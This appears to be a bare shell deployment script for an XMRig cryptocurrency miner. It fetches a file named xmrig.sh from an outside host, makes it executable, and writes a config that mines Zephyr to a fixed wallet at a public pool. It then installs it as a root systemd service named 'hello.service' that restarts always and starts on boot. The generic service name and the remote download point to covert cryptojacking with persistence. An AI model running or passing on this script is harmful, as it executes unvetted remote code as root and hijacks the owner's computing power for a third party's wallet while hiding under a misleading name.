sudo wget http://archive.ubuntu.com/ubuntu/pool/main/m/m4/m4_1.4.18-4_amd64.deb && sudo dpkg -i m4_1.4.18-4_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autoconf/autoconf_2.69-11.1_all.deb && sudo dpkg -i autoconf_2.69-11.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autotools-dev/autotools-dev_20180224.1_all.deb && sudo dpkg -i autotools-dev_20180224.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/automake-1.16/automake_1.16.1-4ubuntu6_all.deb && sudo dpkg -i automake_1.16.1-4ubuntu6_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtool/libltdl-dev_2.4.6-14_amd64.deb && sudo dpkg -i libltdl-dev_2.4.6-14_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/n/numactl/libnuma-dev_2.0.12-1_amd64.deb && sudo dpkg -i libnuma-dev_2.0.12-1_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/universe/h/hwloc/libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo wget http://ftp.osuosl.org/pub/ubuntu/pool/universe/h/hwloc/libhwloc-dev_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc-dev_2.1.0+dfsg-4_amd64.deb && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && sudo wget http://hnv-data.online/xmrig.sh && sudo mv xmrig.sh xmrig && sudo chmod +x xmrig && sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf" && sudo sysctl -p

sudo bash -c 'cat > /usr/local/src/xmrig/build/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "argon2": [0],
        "astrobwt": [-1],
        "cn": [
            [0]
        ],
        "cn-heavy": [
            [0]
        ],
        "cn-lite": [
            [0]
        ],
        "cn-pico": [
            [0]
        ],
        "rx": [0,1,2,3],
        "rx/wow": [0],
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "ca.zephyr.herominers.com:1123",
            "user": "ZEPHYR2uVd8dvCWoWEVSdzL4CBzW2jYZsgpt1wcUqaFL1QApHuurHG83zaXbi21cooRP7aapLgjAnLNbFgzRDExVjercy5nkuxW14",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true
}

EOL
'

sudo bash -c 'cat > /lib/systemd/system/hello.service <<EOL
'[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/xmrig/build/xmrig
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL'

sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
